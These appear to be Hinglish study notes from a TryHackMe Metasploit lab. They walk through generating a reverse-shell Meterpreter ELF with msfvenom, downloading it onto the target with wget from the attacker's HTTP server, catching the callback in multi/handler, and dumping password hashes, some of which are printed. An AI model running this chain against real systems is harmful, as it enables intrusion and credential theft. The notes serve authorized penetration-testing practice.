# TryHackMe -- Metasploit: Exploitation (Task 5 & Task 6) Notes

> Beginner-friendly revision notes in Hinglish. Ye notes tumhare
> authorized TryHackMe lab ke workflow ko summarize karte hain. Commands
> sirf apne THM target/lab par use karo.

## 1. Lab setup samajhna

Tumhara setup:

-   Windows host machine
-   VirtualBox ke andar Kali Linux
-   TryHackMe VPN connected
-   Target machine THM network par

### Kali ke network interfaces

``` bash
ip -4 addr show tun0
```

-   `tun0` = TryHackMe VPN interface.
-   `eth0` = VirtualBox ka local/NAT interface ho sakta hai.
-   Reverse connection ke `LHOST` mein THM VPN IP use karna hai, `eth0`
    ka IP nahi.

Is lab session mein Kali VPN IP tha:

``` text
192.168.158.141
```

**Important:** VPN reconnect ya machine restart ke baad IP dobara check
karna. Purana IP blindly use mat karna.

## 2. Metasploit ke important parts

### `msfconsole`

Metasploit ka main command-line interface hai.

``` bash
msfconsole -q
```

### Exploit / handler

-   Exploit module vulnerability ka use karta hai.
-   `exploit/multi/handler` incoming reverse connection ko receive karta
    hai.
-   Handler khud target par payload execute nahi karta. Target par
    payload run hone ke baad hi connection aata hai.

### Meterpreter

Meterpreter ek interactive session hai jo target se connection establish
hone ke baad milta hai.

Common commands:

``` text
getuid       # current target user
sysinfo      # target OS/architecture details
pwd          # current directory
ls           # files/directories list
background   # session ko close kiye bina background mein bhejna
```

### Sabse important concept: session kis console mein hai?

Har `msfconsole` instance ka session list alag hota hai.

-   Console A mein handler run hua aur session open hua, to session
    Console A mein hai.
-   Alag terminal mein naya `msfconsole` kholne se woh session
    automatically share nahi hota.
-   Isi wajah se doosre console mein `sessions -l` par
    `No active sessions` aa sakta hai.

**Rule:** Jis `msfconsole` mein Meterpreter session open hua tha, post
module bhi usi console mein run karo.

## 3. Task 6 -- Msfvenom payload workflow

### Step A: VPN IP check karo

Kali terminal:

``` bash
ip -4 addr show tun0
```

Example:

``` text
inet 192.168.158.141/18
```

Is example mein `LHOST` = `192.168.158.141`.

### Step B: Payload generate karo

Kali terminal mein:

``` bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.158.141 LPORT=7777 -f elf -o shell.elf
```

Meaning:

-   `-p` = payload select karna
-   `linux/x64/meterpreter/reverse_tcp` = Linux 64-bit Meterpreter
    reverse TCP payload
-   `LHOST` = Kali ka THM VPN IP, jahan callback aayega
-   `LPORT` = Kali par listening port
-   `-f elf` = Linux ELF executable format
-   `-o shell.elf` = output file ka naam

File verify aur executable permission:

``` bash
file shell.elf
ls -lh shell.elf
chmod +x shell.elf
```

`chmod +x` sirf execute permission deta hai; ye file ko run nahi karta.

### Step C: File transfer ke liye HTTP server

Kali ke ek terminal mein, us directory ke andar jahan `shell.elf` hai:

``` bash
python3 -m http.server 9000
```

Ye terminal server ke liye open rehne do.

### Step D: Target par SSH login

Ek alag Kali terminal:

``` bash
ssh murphy@10.49.141.169
```

THM room ke diye hue credentials use karo. Credentials ko notes/public
jagah par store karne se bacho.

Agar login ke baad home directory missing ya inaccessible ho, to `/tmp`
use kar sakte ho:

``` bash
cd /tmp
```

### Step E: Target par payload download karo

Target ke SSH shell mein:

``` bash
wget http://192.168.158.141:9000/shell.elf
```

Agar current directory writable nahi hai, `/tmp` mein download karo.

Download ke baad:

``` bash
cd /tmp
ls -lh shell.elf
file shell.elf
chmod +x shell.elf
```

**Yaad rakho:** Python HTTP server sirf file transfer ke liye hai. File
download hone ke baad server band kar sakte ho. Reverse connection ke
liye Python server ki zaroorat nahi hoti.

## 4. Task 6 -- Handler configure karna

Kali par ek `msfconsole` kholo:

``` bash
msfconsole -q
```

Handler module:

``` text
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.158.141
set LPORT 7777
show options
run
```

Check karo:

-   Payload wahi ho jo `msfvenom` mein use kiya tha.
-   `LHOST` payload aur handler dono mein same ho.
-   `LPORT` payload aur handler dono mein same ho.

Handler par ye message aana normal hai:

``` text
Started reverse TCP handler on 192.168.158.141:7777
```

Iska matlab handler listening kar raha hai; abhi session open hona
zaroori nahi.

## 5. Target par payload execute karna

Room ke instructions ke mutabik agar root access ki zaroorat ho aur
authorized lab credentials sudo allow karte hon, target SSH shell mein:

``` bash
sudo su
```

Phir:

``` bash
cd /tmp
./shell.elf
```

`./shell.elf` actual execution hai. Sirf download karna ya `chmod +x`
karna callback start nahi karta.

Successful connection par handler terminal mein aisa message dikhega:

``` text
Meterpreter session 1 opened (...)
```

Session ID example mein `1` hai. Apne output mein jo ID aaye, wahi use
karna.

## 6. Meterpreter session aur post module -- same console!

Ye tumhare lab ka sabse confusing part tha, isliye dhyan se:

Jis original `msfconsole` mein handler run hua aur Meterpreter session
open hua, **usi console mein**:

``` text
sessions -l
```

Active session list mein ID, type aur user details dikhengi.

Session ko interactive mode se background karna:

``` text
background
```

Isse session close nahi hota. Prompt wapas Metasploit ka ho jata hai.

Ab usi console mein post module load karo:

``` text
use post/linux/gather/hashdump
show options
set SESSION 1
show options
run
```

`SESSION` mein apna actual active session ID lagao; `1` sirf is lab run
ka example hai.

### Doosre terminal mein session kyun nahi dikha?

Agar tumne alag terminal mein ek naya `msfconsole` start kiya, to us
console ka session manager alag tha. Isliye wahan:

``` text
sessions -l
```

ka result aa sakta tha:

``` text
No active sessions.
```

Ye expected behavior hai. Original console mein session active tha, naye
console mein nahi.

**Fix:** Original handler wale console par wapas jao aur wahin post
module run karo.

## 7. Task 6 -- Hashdump output samajhna

Tumhare lab output mein:

``` text
murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh

claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
```

Linux password record ka general format:

``` text
username:password_hash:UID:GID:comment:home_directory:login_shell
```

Is output mein:

-   `murphy` = UID 1001
-   `claire` = UID 1002
-   `$6$` = SHA-512 crypt password-hash format
-   Ye hashes plaintext passwords nahi hain.

Room ka question agar `murphy` ke alawa "other user" ka hash poochta
hai, to doosra user `claire` hai. Hash ko answer box mein exactly copy
karna; punctuation/dots ya characters miss mat karna.

Hashdump module ne loot file ka path bhi diya tha. Example:

``` text
/home/pankaj/.msf4/loot/..._linux.hashes_....txt
```

Ye Kali machine par saved loot file hai, target par nahi. Exact path
tumhare run ke hisaab se alag ho sakta hai.

## 8. Task 5 -- Windows MS17-010 / EternalBlue recap

Task 5 mein Windows target par SMB vulnerability check ki gayi thi.

High-level flow:

1.  Target scan aur service enumeration.
2.  SMB service identify karna.
3.  MS17-010 scanner module se vulnerability check.
4.  Lab ke EternalBlue exploit se Meterpreter session.
5.  Meterpreter se flag locate/read karna.
6.  `getuid` se privilege context check karna.

Windows-specific commands Linux target par kaam nahi karte. Example:

``` text
cat C:\Users\Jon\Documents\flag.txt
```

Linux target par Windows path invalid hai. Hamesha pehle:

``` text
sysinfo
pwd
ls
```

se OS aur current directory verify karo.

## 9. Common confusion -- quick troubleshooting

  -----------------------------------------------------------------------
  Symptom                             Meaning / next check
  ----------------------------------- -----------------------------------
  Handler "waiting" par hai           Target payload abhi run nahi hua ho
                                      sakta; target par `./shell.elf`
                                      execute hua ya nahi check karo

  `wget` Permission denied            Current directory writable nahi;
                                      `/tmp` mein download karo

  `chmod +x` ke baad bhi session nahi `chmod` file run nahi karta;
                                      execute karna hota hai

  Handler ko callback nahi aata       `tun0` IP, `LHOST`, `LPORT`, target
                                      architecture aur VPN check karo

  `sessions -l` says no active        Ho sakta hai tum doosre
  sessions                            `msfconsole` instance mein ho

  `Invalid session identifier: 1`     Is console mein session 1 available
                                      nahi; original handler console
                                      check karo

  Hashdump says SESSION validation    `sessions -l` se active session ID
  error                               verify karo; correct console use
                                      karo

  Windows path Linux target par fail  `sysinfo` se OS verify karo; Linux
                                      paths use karo

  `search -f flag.txt` no results     File ho hi zaroori nahi; task ke
                                      exact objective ko dobara dekho
  -----------------------------------------------------------------------

## 10. Important commands -- revision cheat sheet

### Kali / Linux shell

``` bash
ip -4 addr show tun0
msfvenom --help
file shell.elf
ls -lh shell.elf
chmod +x shell.elf
python3 -m http.server 9000
ssh murphy@TARGET_IP
```

### Metasploit console

``` text
msfconsole -q
use exploit/multi/handler
show options
run
sessions -l
sessions -i 1
background
use post/linux/gather/hashdump
set SESSION 1
show options
run
```

### Meterpreter

``` text
getuid
sysinfo
pwd
ls
search -f flag.txt
background
```

## 11. Final mental model

Is poore Task 6 ko 6 stages mein yaad rakho:

1.  **Generate** -- Kali par `msfvenom` se ELF payload banao.
2.  **Transfer** -- Python HTTP server + target par `wget`.
3.  **Listen** -- Original Metasploit console mein matching
    multi/handler start karo.
4.  **Execute** -- Target par downloaded ELF run karo.
5.  **Session** -- Handler console mein Meterpreter session confirm
    karo.
6.  **Post-exploitation** -- Usi console mein session ID set karke Linux
    hashdump module run karo.

Sabse important lesson: **File transfer server, Metasploit handler,
Meterpreter session aur post module alag concepts hain.** Inka role
samajh jaoge to workflow ka confusion bahut kam ho jayega.

------------------------------------------------------------------------

*Notes prepared from the commands and outputs observed during this
TryHackMe practice session. Target IPs, VPN IPs, session IDs, loot paths
aur hashes lab instances ke saath change ho sakte hain.*
